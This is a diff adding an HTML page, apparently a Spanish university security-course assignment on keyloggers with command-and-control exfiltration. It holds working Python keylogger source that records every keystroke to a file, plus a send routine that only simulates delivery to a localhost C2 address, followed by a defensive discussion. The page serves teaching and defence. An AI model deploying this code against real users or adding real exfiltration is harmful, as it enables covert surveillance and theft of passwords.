@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actividad 13: Exfiltración y C2 | CNO V</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <link rel="stylesheet" href="style2.css"> 
+</head>
+<body>
+
+    <div class="scanlines"></div>
+
+    <div class="container">
+        
+        <header>
+            <div class="header-top">
+                <div class="user-info">
+                    <h1 class="glitch" data-text="ACT.13: EXFILTRACIÓN Y C2 (SPYWARE AVANZADO)">ACT.13: SPYWARE AVANZADO</h1>
+                    <p class="subtitle">> TEMA: <span class="highlight">COMUNICACIÓN EXTERNA Y ROBO DE DATOS</span></p>
+                    <p class="subtitle">> EQUIPO: [05] | ALUMNO: [Coronado Noriega Jesús Olaf - 178991]</p>
+                </div>
+                <div style="text-align: right; min-width: 150px;">
+                    <a href="../actividades.html" class="cyber-btn" style="font-size: 0.8rem;">
+                        << VOLVER A LISTA
+                    </a>
+                </div>
+            </div>
+        </header>
+
+        <section class="panel">
+            <h2><span class="prefix">#</span> 01_FUNDAMENTOS_OPERATIVOS</h2>
+            
+            <div class="grid-2">
+                <div class="content-box">
+                    <h3 style="color: var(--nixie-glow); margin-top:0;">// EVOLUCIÓN_DEL_VECTOR</h3>
+                    <p>> <strong>Diferencia Operativa (Vs. Actividad 12):</strong> Mientras la iteración anterior se limitaba a la observación pasiva y registro en memoria, este nuevo módulo incorpora persistencia en disco duro (bitácora .txt) y, crucialmente, establece un canal de exfiltración hacia un servidor Command & Control (C2). Esto replica la fase de transmisión de datos característica de las Amenazas Persistentes Avanzadas (APTs).</p>
+                    <p>> <strong>Infraestructura C2:</strong> Un servidor "Command & Control" es el centro neurológico remoto operado por el atacante. Su función es recibir la telemetría y los datos robados (credenciales, pulsaciones) del equipo comprometido, además de enviar nuevas instrucciones al malware instalado.</p>
+                </div>
+
+                <div class="content-box">
+                    <h3 style="color: var(--nixie-glow); margin-top:0;">// LÓGICA_DE_PROGRAMACIÓN</h3>
+                    <ul class="binary-list">
+                        <li>> <strong>Escritura Síncrona (flush=True):</strong> Forza al sistema a vaciar el buffer de salida e imprimir en consola inmediatamente. Útil para que el atacante monitoree en tiempo real la captura sin esperar a que el bloque de memoria se llene.</li>
+                        <li>> <strong>Manejo de Teclas Especiales:</strong> Se capturan los <code>AttributeError</code> para traducir teclas del sistema. Por ejemplo, <code>Key.enter</code> se formatea como un salto de línea (<code>\n</code>), manteniendo la bitácora legible.</li>
+                        <li>> <strong>Modo Append ("a"):</strong> Al abrir el archivo de log con "a", el puntero se coloca al final del documento. Esto asegura que la captura sea continua y no sobrescriba ni destruya el historial de sesiones previas.</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section class="panel">
+            <h2><span class="prefix">#</span> 02_ANÁLISIS_TÉCNICO_Y_CÓDIGO</h2>
+            
+            <div class="accordion-wrapper">
+                <div class="accordion-item">
+                    <button class="accordion-btn active" onclick="toggleAccordion(this)">
+                        [FASE_1] Desglose de Componentes del Malware
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content" style="display: block;">
+                        <div class="table-responsive" style="margin: 15px 0;">
+                            <table class="cyber-table">
+                                <thead>
+                                    <tr>
+                                        <th>Componente de Código</th>
+                                        <th>Función Técnica</th>
+                                        <th>Propósito en el Ataque</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td class="highlight">LOG_FILE (.txt)</td>
+                                        <td>Archivo local de almacenamiento</td>
+                                        <td>Garantizar la persistencia de los datos capturados en el disco local antes del envío.</td>
+                                    </tr>
+                                    <tr>
+                                        <td class="highlight">C2_URL</td>
+                                        <td>Endpoint HTTP/HTTPS destino</td>
+                                        <td>Dirección de red hacia donde se exfiltrará la inteligencia robada.</td>
+                                    </tr>
+                                    <tr>
+                                        <td class="highlight">enviar_al_c2()</td>
+                                        <td>Lectura de I/O y petición web</td>
+                                        <td>Ejecuta la fase final del ciclo del malware: la transmisión de la bitácora al atacante.</td>
+                                    </tr>
+                                    <tr>
+                                        <td class="highlight">open(..., "a")</td>
+                                        <td>Apertura de archivo modo Append</td>
+                                        <td>Acumulación ininterrumpida de pulsaciones sin pérdida de datos anteriores.</td>
+                                    </tr>
+                                    <tr>
+                                        <td class="highlight">Key.esc</td>
+                                        <td>Trigger de interrupción (Killswitch)</td>
+                                        <td>Condición de salida oculta que detiene la escucha y dispara automáticamente la exfiltración.</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [FASE_2] Estructura del Script (Payload)
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="terminal-code-box" style="margin-top: 15px;">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">keylogger_c2.py</span></div>
+                            <div class="terminal-body">
+                                <span class="comment"># Importación de librerías para manipulación de archivos y teclado</span><br>
+                                <span class="command">import os</span><br>
+                                <span class="command">from pynput.keyboard import Key, Listener</span><br><br>
+
+                                <span class="comment"># Configuración de rutas y endpoint C2</span><br>
+                                <span class="command">LOG_FILE = "178991_act13_log.txt"</span><br>
+                                <span class="command">C2_URL = "http://localhost:8080/report"</span><br><br>
+
+                                <span class="comment"># Función de exfiltración: lee el log y simula envío al servidor</span><br>
+                                <span class="command">def enviar_al_c2():</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;if os.path.exists(LOG_FILE):</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with open(LOG_FILE, 'r', encoding='utf-8') as f:</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;datos = f.read()</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"\n[+] Enviando reporte a: {C2_URL}")</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print("[+] Log enviado correctamente al C2.")</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except Exception as e:</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"[-] Error en comunicación: {e}")</span><br><br>
+
+                                <span class="comment"># Callback de pulsación: captura, formatea y escribe a disco</span><br>
+                                <span class="command">def on_press(key):</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;try:</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tecla = str(key.char)</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;except AttributeError:</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if key == Key.space:</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tecla = " "</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif key == Key.enter:</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tecla = "\n"</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif key == Key.tab:</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tecla = "[TAB]"</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tecla = f" [{key}] "</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;print(tecla, end="", flush=True)</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;with open(LOG_FILE, "a", encoding="utf-8") as f:</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(tecla)</span><br><br>
+
+                                <span class="comment"># Callback de liberación: ESC detiene el listener y activa C2</span><br>
+                                <span class="command">def on_release(key):</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;if key == Key.esc:</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print("\n[*] Finalizando captura...")</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enviar_al_c2()</span><br>
+                                <span class="command">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <section class="panel">
+            <h2><span class="prefix">#</span> 03_ANÁLISIS_POST_MORTEM_Y_DEFENSA</h2>
+            
+            <div class="content-box" style="border-color: var(--terminal-green);">
+                <h3 style="color: var(--terminal-green); margin-top:0;">// REFLEXIÓN_ESTRATÉGICA</h3>
+                <p style="font-size: 0.95rem; line-height: 1.5; color: #ccc;">
+                    La brecha arquitectónica entre un keylogger local y uno con capacidad de red radica en la <strong>escalada del impacto</strong>. Mientras la actividad previa se limitaba a la observación pasiva (requiriendo que el atacante recuperara el archivo físicamente), este script introduce la exfiltración de datos. Esta es la fase terminal del ciclo de vida del malware, donde la información confidencial abandona definitivamente el perímetro de la víctima.
+                </p>
+                <p style="font-size: 0.95rem; line-height: 1.5; color: #ccc; margin-top: 10px;">
+                    La simulación de este canal C2 evidencia por qué el endurecimiento del perímetro interno es vital. Un atacante moderno no necesita mantener una conexión entrante constante; le basta con que el host comprometido tenga permisos para realizar conexiones salientes (Outbound traffic).
+                </p>
+                <p style="font-size: 0.95rem; line-height: 1.5; color: #ccc; margin-top: 10px;">
+                    Desde la perspectiva defensiva (Blue Team), este ejercicio subraya la necesidad de implementar soluciones <strong>DLP (Data Loss Prevention)</strong>, inspección profunda de tráfico saliente y sistemas <strong>EDR (Endpoint Detection and Response)</strong>. Aplicar el <em>Principio de Mínimo Privilegio</em> a nivel de red significa que si un proceso en segundo plano no tiene justificación operativa para comunicarse con internet, el Firewall debe bloquear su salida irrevocablemente.
+                </p>
+            </div>
+        </section>
+
+        
+
+        <footer>
+            <div class="footer-content">
+                <p class="copyright">
+                    © 2026 [Hououin] | CNO V SEGURIDAD INFORMÁTICA
+                </p>
+            </div>
+        </footer>
+
+    </div>
+    
+    <script src="script2.js"></script>
+    
+</body>
+</html>
